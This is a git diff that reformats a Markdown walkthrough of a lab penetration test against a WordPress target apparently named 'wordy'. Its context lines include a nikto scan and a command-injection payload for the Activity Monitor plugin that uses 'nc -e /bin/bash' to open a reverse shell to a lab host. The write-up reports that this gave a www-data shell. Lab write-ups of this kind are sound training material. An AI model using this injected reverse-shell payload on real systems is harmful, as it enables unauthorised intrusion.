@@ -66,12 +66,8 @@ echo "192.168.182.135 wordy" >> /etc/hosts
 sudo nikto -h http://wordy/
 ```
 
-<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/1efc6be5-bbfe-45a4-b98b-1f02a3ecbd16" />
+<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/1efc6be5-bbfe-45a4-b98b-1f02a3ecbd16" /><br>
 
-
-
-These findings confirmed that the target was running a WordPress application, 
-which became the primary focus for further enumeration and exploitation.
 
 **Key Findings:**
 
@@ -80,6 +76,9 @@ which became the primary focus for further enumeration and exploitation.
 * WordPress detected
 * Directory indexing enabled
 * Login page exposed
+ 
+These findings confirmed that the target was running a WordPress application, so further enumeration was focused
+on WordPress-specific tools.
 
 ---
 
@@ -148,12 +147,10 @@ The **Activity Monitor plugin** was vulnerable to command injection.
 127.0.0.1 | nc -e /bin/bash 192.168.182.129 4444
 ```
 
-<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/53c10782-7e8a-42d1-ae9e-a02fdf56d48f" />
+<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/53c10782-7e8a-42d1-ae9e-a02fdf56d48f" /><br>
 
 
-### Result
-
-Reverse shell obtained as **www-data**
+**Result:** Reverse shell obtained as www-data<br><br>
 
 <img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/ea2f47d1-7a90-4210-a782-03ea4c481443" />
 
